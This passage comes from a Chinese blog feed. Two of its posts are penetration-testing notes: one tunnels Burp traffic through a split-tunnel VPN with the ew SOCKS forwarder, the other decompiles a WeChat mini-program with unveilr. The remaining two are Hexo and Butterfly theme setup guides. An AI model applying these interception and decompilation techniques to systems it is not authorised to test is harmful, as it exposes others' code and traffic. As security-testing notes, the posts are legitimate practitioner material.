      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1VPN%E4%B8%8D%E8%B5%B0%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1VPN%E4%B8%8D%E8%B5%B0%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>站点：内网 web 环境</p><p>访问方式：本地下载VPN连接，访问web站点</p><p>问题：使用burp正常抓包，发现没有响应</p><h3 id="0x01-抓包分析"><a href="#0x01-抓包分析" class="headerlink" title="0x01 抓包分析"></a>0x01 抓包分析</h3><p>1、首先，访问站点，使用burp抓包，发现可以抓到请求包，但没有响应</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026848.png" alt="image-20240410102621701">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026529.png" alt="image-20240410102629496">  </p><p>2、同时，开启burp代理抓包后，web站点不能访问；关闭代理，又可以正常访问：</p><ul><li>关闭代理</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026082.png" alt="image-20240410102635955">  </p><ul><li>开启代理</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026949.png" alt="image-20240410102642920">  </p><p>3、通过wireshark抓包分析，可以看到，当burp抓包重放后，流量不再经过我们的VPN，而是在发送到了当前WIFI所在内网中：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026628.png" alt="image-20240410102651606">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026537.png" alt="image-20240410102657524">  </p><p>这块的 10.xx.xx.48为目标测试地址；10.101.22.62为当前wifi地址。</p><p>4、初步猜测，是easyconnect VPN不是全局代理，只是针对部分exe类应用，如浏览器(chrome.exe)、cmd.exe等做了代理。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027473.png" alt="image-20240410102709452">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027129.png" alt="image-20240410102716102">  </p><h3 id="0x02-解决办法"><a href="#0x02-解决办法" class="headerlink" title="0x02 解决办法"></a>0x02 解决办法</h3><p>使用端口转发工具做端口转发。让流量的一个走向为：浏览器-&gt;burp-&gt;端口转发-&gt;VPN-&gt;服务端</p><ul><li>端口转发工具：ew（其它类似工具也可以）</li><li>转发代理：走socks5代理</li></ul><p>1、使用ew设置全局端口转发</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027828.png" alt="image-20240410102723818">  </p><p>2、burp配置socks代理</p><p>user options –&gt; socks proxy，配置同ew即可</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027392.png" alt="image-20240410102730363">  </p><p>3、浏览器开启http代理，正常请求</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027207.png" alt="image-20240410102736179">  </p><p>4、使用burp成功抓包</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027630.png" alt="image-20240410102742575">  </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 抓包 </tag>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unveilr反编译微信小程序</title>
      <link href="/2024/04/06/unveilr%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
      <url>/2024/04/06/unveilr%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024241.png" alt="image-20240410102424221">  </p><p>针对与微信小程序，网上的工具比较多，但个人感觉比较好用的是 unveilr.exe。下面针对这个工具主要介绍一下使用方法。</p><h2 id="定位小程序中加载的-wxapkg文件"><a href="#定位小程序中加载的-wxapkg文件" class="headerlink" title="定位小程序中加载的.wxapkg文件"></a>定位小程序中加载的.wxapkg文件</h2><p>1、微信设置中找到文件夹所在位置。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024205.png" alt="image-20240410102432189">  </p><p>2、定位过去，找到APPlet文件夹，该文件夹下面存放的是小程序加载后的缓存文件。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024112.png" alt="image-20240410102439099">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024810.png" alt="image-20240410102446795">  </p><p>3、由于可能之前加载过其他的小程序，在定位目标程序之前，可以将APPlet文件夹下内容清空</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024280.png" alt="image-20240410102453267">  </p><p>4、加载目标程序，这块以【xxx就业】小程序为例</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025831.png" alt="image-20240410102507813"> </p><p>5、获取到加载的小程序.wxakg文件</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025226.png" alt="image-20240410102515218">  </p><h2 id="unveilr反编译-wxakg文件"><a href="#unveilr反编译-wxakg文件" class="headerlink" title="unveilr反编译.wxakg文件"></a>unveilr反编译.wxakg文件</h2><p>1、使用如下命令，对目标小程序进行反编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unveilr.exe &quot;xxxx\Applet\wxff689bf2602ab223\12&quot;   //这块直接写文件夹名称就行，会自动读取加载的</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025538.png" alt="image-20240410102520524">  </p><h2 id="微信开发者助手加载进行调试"><a href="#微信开发者助手加载进行调试" class="headerlink" title="微信开发者助手加载进行调试"></a>微信开发者助手加载进行调试</h2><p>1、成功加载了小程序，但是有个报错：”不在以下 request 合法域名列表中”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025220.png" alt="image-20240410102526174">  </p><p>解决办法：详情-&gt;本地设置，勾选上不校验合法域名：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025042.png" alt="image-20240410102532006">  </p><p>重新加载小程序，发现没有报错了！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025787.png" alt="image-20240410102537744">  </p><p>2、点击【职位】模块，报错 “ Cannot read property ‘length’ of undefined”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025628.png" alt="image-20240410102543598">  </p><p>解决办法：参考如下链接</p><p><a href="https://developers.weixin.qq.com/community/develop/doc/000e2e36b6c8106a882a514495d000">https://developers.weixin.qq.com/community/develop/doc/000e2e36b6c8106a882a514495d000</a></p><p>使用 res.data.result 前 ，先使用 if(res.data&amp;&amp;res.data.result) 进行空值判断，为真后继续你的逻辑处理。</p><p><a href="https://blog.csdn.net/lily__an/article/details/89226181">https://blog.csdn.net/lily__an/article/details/89226181</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025509.png" alt="image-20240410102549484">  </p><p>按照这种解决办法，可以修改JS中的代码如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025348.png" alt="image-20240410102556317">  </p><p>重新加载，就会发现不再报错了！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026431.png" alt="image-20240410102602390">  </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>排错思路，就是哪里有问题解决哪里的问题。</p><p>这种一般网上找解决办法都是有的，百度就ok！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> unveilr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo开始写博客</title>
      <link href="/2024/03/26/hexo%E5%BC%80%E5%A7%8B%E5%86%99%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/03/26/hexo%E5%BC%80%E5%A7%8B%E5%86%99%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h1><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new [layout] title  或  hexo n [layout] title</span><br></pre></td></tr></table></figure><p>创建文章前要先选定模板，在hexo中也叫做布局。hexo支持三种布局（layout）：post(默认)、draft、page。</p><p>这块先介绍如何使用已有布局，后面还将会介绍如何自定义布局。</p><p>在博客目录下输入以下命令时，会默认使用post布局，然后自动在source_posts目录生成一个text.md文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo n text</span><br></pre></td></tr></table></figure><p>当然，也可以执行布局</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo n [layout_name] draft1</span><br></pre></td></tr></table></figure><p>该命令创建了一个使用特定布局的名为draft1的文章。</p><p>打开之前创建的test.md文件，可以看到文章开头包含如下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: text1</span><br><span class="line">author: luyao</span><br><span class="line">date: 2020-04-10 04:13:36</span><br><span class="line">tags: hexo</span><br><span class="line">categories: blog</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>如何自定义布局呢？实际上，布局是一个markdown文件，它们保存在scaffolds&#x2F;目录下，可以看到hexo自带的三种布局其实就是三个.md文件：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022175.png" alt="image-20240410102220147">  </p><p>每一个文件中的内容实际只包含一个Front-matter。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022119.png" alt="image-20240410102227091">  </p><p>因此，可以在这里修改布局或者建立新的布局，然后创建文章时使用这些布局。</p><h1 id="开始写文章"><a href="#开始写文章" class="headerlink" title="开始写文章"></a>开始写文章</h1><p>两个虚线之间的内容就是叫Front-matter，主要是文章的配置，具体配置如下，不同主题配置不一样，这块以<strong>Matery</strong>主题为例</p><p>Front-matter 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 title 和 date 的值。</p><table><thead><tr><th align="center"><strong>配置选项</strong></th><th align="center"><strong>默认值</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td align="center">title</td><td align="center">Markdown 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td align="center">date</td><td align="center">文件创建时间日期</td><td>建议使用发布日期时间</td></tr><tr><td align="center">author</td><td align="center">根 _config.yml 中的 author</td><td>文章作者</td></tr><tr><td align="center">img</td><td align="center">featureImages 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <a href="http://xxx.com/xxx.jpg">http://xxx.com/xxx.jpg</a></td></tr><tr><td align="center">top</td><td align="center">true</td><td>推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章</td></tr><tr><td align="center">cover</td><td align="center">false</td><td>v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td align="center">coverImg</td><td align="center">无</td><td>v1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td align="center">password</td><td align="center">无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项</td></tr><tr><td align="center">toc</td><td align="center">true</td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项</td></tr><tr><td align="center">mathjax</td><td align="center">false</td><td>是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行</td></tr><tr><td align="center">summary</td><td align="center">无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td align="center">categories</td><td align="center">无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td align="center">tags</td><td align="center">无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td align="center">keywords</td><td align="center">文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td align="center">reprintPolicy</td><td align="center">cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><p>以下为文章的 Front-mattre示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexo开始写博客</span><br><span class="line">date: 2024-03-26 09:25:00</span><br><span class="line">author: Muhe</span><br><span class="line">img: /source/images/xxx.jpg</span><br><span class="line">top: true</span><br><span class="line">cover: true</span><br><span class="line">coverImg: /images/1.jpg</span><br><span class="line">password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</span><br><span class="line">toc: false</span><br><span class="line">mathjax: false</span><br><span class="line">summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</span><br><span class="line">categories: Markdown</span><br><span class="line">tags:</span><br><span class="line">  - Typora</span><br><span class="line">  - Markdown</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>【Tips】发现一个问题，每次hexo n的时候Front-matter中内容少的可怜，那怎么修改默认的格式呢？只要去主目录下找到scaffolds文件夹下找到一个post.md文件修改即可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"># 标题</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">author: 无敌小小弋</span><br><span class="line"># 简述</span><br><span class="line">summary:</span><br><span class="line"># 使用自定义封面 </span><br><span class="line">img: </span><br><span class="line"># 是否置顶true，或者去掉</span><br><span class="line">top: true</span><br><span class="line"># 轮播</span><br><span class="line">cover:</span><br><span class="line"># 轮播图</span><br><span class="line">coverImg: </span><br><span class="line"># 标签</span><br><span class="line">tags: </span><br><span class="line"># 分类</span><br><span class="line">categories: </span><br><span class="line"># 是否加密文章，SHA256加密</span><br><span class="line">password: </span><br><span class="line">---</span><br></pre></td></tr></table></figure><h1 id="文章插入图片"><a href="#文章插入图片" class="headerlink" title="文章插入图片"></a>文章插入图片</h1><p>图片几乎是写博客时不可或缺的元素。在hexo中插入图片需要先进行一些设置，不过在介绍那之前让我们先回顾一下markdown引用图片的语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![alt](path [title])</span><br></pre></td></tr></table></figure><ul><li>path是必选的，表示图片的路径，可使用绝对或相对路径。</li><li>alt是可选的，是图片无法加载时的替代描述文本。</li><li>title是可选的，是图片的标题。</li></ul><p>在hexo中，引用图片不是简单的使用上述语法即可，你还需要为图片制定一个<strong>资源文件夹</strong>。具体来说，hexo中文章引用图片有两种方式：</p><ol><li><p>将所有文章的图片放到source&#x2F;images 文件夹中（没有就自己创建一个），然后使用markdown语句引用图片。这种方法一般适用于包含少量图片的hexo项目，但是当文章数量增多，图片数也随之增加后，该管理方式就显得有些混乱。因此我个人推荐你使用下面一种方法。</p></li><li><p>为每一个文章创建一个资源文件夹，将图片保存其中，具体步骤如下：</p><ul><li><p>在博客根目录打开_config.yml文件做如下修改：<br>yaml post_asset_folder: true</p></li><li><p>然后使用hexo n text命令后创建一个使用post布局名为text的文章，你将发现hexo在\source_post文件夹下创建了一个\text文件夹以及同名的.md文件：</p></li><li><p>最后就可以打开text.md文件进行编辑了，你可以把要引用的图片放到同名文件夹下，然后使用相对路径进行引用。<strong>注意</strong>：请不要自作聪明将text.md文件移动到同名文件夹下，经本人尝试，发现这样会导致图片无法正常引用。</p></li></ul></li></ol><p><strong>Tip</strong>：如果你使用的是<a href="https://link.zhihu.com/?target=https://www.typora.io/">Typora</a>编辑器，可以在编辑器的文件&#x2F;偏好设置&#x2F;图像中进行如下设置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022069.png" alt="image-20240410102243042">  </p><p>这样每次直接拷贝到文章的截图将会被自动保存到同名的文件夹下，非常方便~</p><p>但有可能设置了上面的相关配置后，图片依旧加载不出来，下面是两种解决办法：</p><h2 id="本地图片加载不出来"><a href="#本地图片加载不出来" class="headerlink" title="本地图片加载不出来"></a>本地图片加载不出来</h2><p>插件<a href="https://link.zhihu.com/?target=https://github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a>解决了这个问题。可以直接用npm install hexo-renderer-marked命令直接安装，之后在config.yaml中更改配置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br></pre></td></tr></table></figure><p>hexo三连后，本地加载的图片就可以正常显示了。</p><h2 id="在线图片加载不出来"><a href="#在线图片加载不出来" class="headerlink" title="在线图片加载不出来"></a>在线图片加载不出来</h2><p>这个解决方法其实很简单，只需要文章的头部如下图所示位置添加<meta name="referrer" content="no-referrer"/>这一句话就可以完美解决问题</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022344.png" alt="image-20240410102251316">  </p><h1 id="插入视频"><a href="#插入视频" class="headerlink" title="插入视频"></a>插入视频</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video width=&quot;480&quot; height=&quot;320&quot; controls&gt;</span><br><span class="line">     &lt;source src=video_path&gt;</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></table></figure><ul><li>video_path是视频的存储路径（含双引号），你可以把视频放在文章的同名资源文件夹下，然后用相对路径方式引用。</li><li>width和height是视频区块的宽度和高度，可自定义。</li></ul><h1 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h1><p>删除文章的过程一样也很简单，先删除本地文件，然后通过生成和部署命令进而将远程仓库中的文件也一并删除。具体来说，以最开始默认形成的helloworld.md这篇文章为例。</p><p>首先进入到source &#x2F; _post 文件夹中，找到helloworld.md文件，在本地直接执行删除。然后依次执行hexo g，hexo d，再去主页查看你就会发现你的博客上面已经空空如也了，这就是如何删除文章的方法。</p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义博客主题相关设置</title>
      <link href="/2024/03/22/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"/>
      <url>/2024/03/22/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="安装butterfly主题"><a href="#安装butterfly主题" class="headerlink" title="安装butterfly主题"></a>安装butterfly主题</h1><p>首先，在hexo的根目录下使用如下命令下载主题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>npm安装pug 和 stylus 渲染器。不然会报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>修改项目根目录下的_config.yml文件（称为站点配置文件），开启主题。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p>【建议】</p><p>为了减少升级&#x2F;修改主题带来的不便，可以将主题目录下（&#x2F;blog&#x2F;theme）的配置文件 _config.yml 重命名为 _config.butterfly.yml，复制到 Hexo 根目录下与_config.yml同级。</p><p>Hexo会自动合并主题中的_config.yml和 _config.butterfly.yml ，如果存在同名配置，会使用_config.butterfly.yml的配置，其优先度较高。所以像和博客网址相关联的固定资料可以设置在_config.yml中，比如博客的标题、作者信息和邮箱等等资料，而和主题样式相关的配置放在 _config.butterfly.yml 中，那么在将来你想换一个主题是很方便的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091730067.png" alt="image-20240409173030013"> </p><h1 id="导航栏菜单"><a href="#导航栏菜单" class="headerlink" title="导航栏菜单"></a>导航栏菜单</h1><p>修改主题配置文件 _config.butterfly.yml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  主页: / || fas fa-home</span><br><span class="line">  博文 || fa fa-graduation-cap:</span><br><span class="line">    分类: /categories/ || fa fa-archive</span><br><span class="line">    标签: /tags/ || fa fa-tags</span><br><span class="line">    归档: /archives/ || fa fa-folder-open</span><br><span class="line">  生活 || fas fa-list:</span><br><span class="line">    分享: /shuoshuo/ || fa fa-comments-o</span><br><span class="line">    相册: /photos/ || fa fa-camera-retro</span><br><span class="line">    音乐: /music/ || fa fa-music</span><br><span class="line">    影视: /movies/ || fas fa-video</span><br><span class="line">  友链: /links/ || fa fa-link</span><br><span class="line">  留言板: /comment/ || fa fa-paper-plane</span><br><span class="line">  #留言板: /messageboard/ || fa fa-paper-plane</span><br><span class="line">  关于笔者: /about/ || fas fa-heart  </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731911.png" alt="image-20240409173101879">  </p><h1 id="代码块显示"><a href="#代码块显示" class="headerlink" title="代码块显示"></a>代码块显示</h1><p>在_config.butterfly.yml配置文件中可以配置如下功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: mac  #  darker / pale night / light / ocean / mac / mac light / false 代码主题</span><br><span class="line">highlight_copy: true # 复制按钮</span><br><span class="line">highlight_lang: false # 是否显示代码语言</span><br><span class="line">highlight_shrink: false # true: 代码块默认不展开 / false: 代码块默认展开 | none: 展开并隐藏折叠按钮</span><br><span class="line">highlight_height_limit: false # unit: px</span><br><span class="line">code_word_wrap: false #代码自动换行，关闭滚动条</span><br></pre></td></tr></table></figure><p>同时将站点默认配置文件_config.yml的highlight设置为false。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  enable: false</span><br><span class="line">  line_number: false</span><br><span class="line">  auto_detect: false</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731319.png" alt="image-20240409173121285"> </p><h1 id="本地搜索功能"><a href="#本地搜索功能" class="headerlink" title="本地搜索功能"></a>本地搜索功能</h1><p>如果要使用本地搜索功能，需要安装 hexo-generator-search 插件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>修改_config.butterfly.yml 配置文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#x27;t find any results for the search: $&#123;query&#125;&quot; # 如果没有查到内容相关内容显示</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731709.png" alt="image-20240409173142597">  </p><h1 id="修改副标题"><a href="#修改副标题" class="headerlink" title="修改副标题"></a>修改副标题</h1><p>修改主题配置文件 _config.butterfly.yml:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># the subtitle on homepage (主頁subtitle)</span><br><span class="line">subtitle:</span><br><span class="line">  enable: true</span><br><span class="line">  # Typewriter Effect (开启打字效果)</span><br><span class="line">  effect: true</span><br><span class="line">  # loop (循環打字)</span><br><span class="line">  loop: true</span><br><span class="line">  # source調用第三方服務</span><br><span class="line">  # source: false 關閉調用</span><br><span class="line">  # source: 1  調用搏天api的隨機語錄（簡體）</span><br><span class="line">  # source: 2  調用一言網的一句話（簡體）</span><br><span class="line">  # source: 3  調用一句網（簡體）</span><br><span class="line">  # source: 4  調用今日詩詞（簡體）</span><br><span class="line">  # subtitle 會先顯示 source , 再顯示 sub 的內容</span><br><span class="line">  source: false</span><br><span class="line">  # 如果有英文逗号&#x27; , &#x27;,请使用转义字元 &amp;#44;</span><br><span class="line">  # 如果有英文双引号&#x27; &quot; &#x27;,请使用转义字元 &amp;quot;</span><br><span class="line">  # 开头不允許转义字元，如需要，请把整個句子用双引号包住</span><br><span class="line">  # 如果关闭打字效果，subtitle只会现示sub的第一行文字</span><br><span class="line">  sub:</span><br><span class="line">    - 从来没有真正的绝境，只有心灵的迷途</span><br><span class="line">    - Never really desperate，only the lost of the soul</span><br><span class="line">    - 没有选择会是唯一的路</span><br><span class="line">    - No choice will be the only way</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731603.png" alt="image-20240409173155522">   </p><h1 id="图片设置"><a href="#图片设置" class="headerlink" title="图片设置"></a>图片设置</h1><p>图片可以用云链接或者本地路径：&#x2F;themes&#x2F;butterfly&#x2F;source&#x2F;img。修改主题配置文件_config.butterfly.yml：</p><h2 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Favicon（网站图）</span><br><span class="line">favicon: /img/favicon.png</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091732790.png" alt="image-20240409173204664">  </p><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  img: /img/avatar.jpg #图片路径</span><br><span class="line">  effect: false #头像会一直转圈  </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091737311.png" alt="image-20240409173712278">  </p><h2 id="主页封面图片"><a href="#主页封面图片" class="headerlink" title="主页封面图片"></a>主页封面图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># The banner image of home page</span><br><span class="line">index_img: /img/background.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091738768.png" alt="image-20240409173816493">  </p><h2 id="文章详情页顶部图片"><a href="#文章详情页顶部图片" class="headerlink" title="文章详情页顶部图片"></a>文章详情页顶部图片</h2><p>当没有在front-matter设置top_img和cover的情况下会显示该图</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If the banner of page not setting, it will show the top_img</span><br><span class="line">default_top_img: /img/default_top_img.jpg </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091739148.png" alt="image-20240409173923951">  </p><h2 id="归档页底部图片"><a href="#归档页底部图片" class="headerlink" title="归档页底部图片"></a>归档页底部图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#归档子标签页图片</span><br><span class="line"># The banner image of archive page</span><br><span class="line">archive_img: /img/archive.jpg</span><br></pre></td></tr></table></figure><h2 id="tag页顶部图片"><a href="#tag页顶部图片" class="headerlink" title="tag页顶部图片"></a>tag页顶部图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#tag页（标签页）</span><br><span class="line">tag_img: /img/tag_img.jpg</span><br></pre></td></tr></table></figure><h2 id="category页顶部图片"><a href="#category页顶部图片" class="headerlink" title="category页顶部图片"></a>category页顶部图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#category页</span><br><span class="line">category_img: /img/category_img.jpg</span><br></pre></td></tr></table></figure><h2 id="统一文章封面"><a href="#统一文章封面" class="headerlink" title="统一文章封面"></a>统一文章封面</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cover:</span><br><span class="line">  index_enable: true #  是否展示文章封面</span><br><span class="line">  aside_enable: true</span><br><span class="line">  archives_enable: true</span><br><span class="line">  position: both # 封面展示的位置 left/right/both</span><br><span class="line">  # 当没有设置cover时，默认展示的文章封面</span><br><span class="line">  default_cover:</span><br><span class="line">    # 当配置多张图片时，会随机选择一张作为 cover. 此时写法为</span><br><span class="line">    - https:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br></pre></td></tr></table></figure><p>如果需要为每一篇文章设置不同的封面，可以在文章的md文件中添加配置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World        # 标题</span><br><span class="line">tags: [hello]             # 标签</span><br><span class="line">categories:               # 分类</span><br><span class="line">description: hello word~  # 描述</span><br><span class="line">top_img: /img/hello-1.png # 顶部背景图</span><br><span class="line">cover: /img/hello-1.png   # 文章封面</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091739478.png" 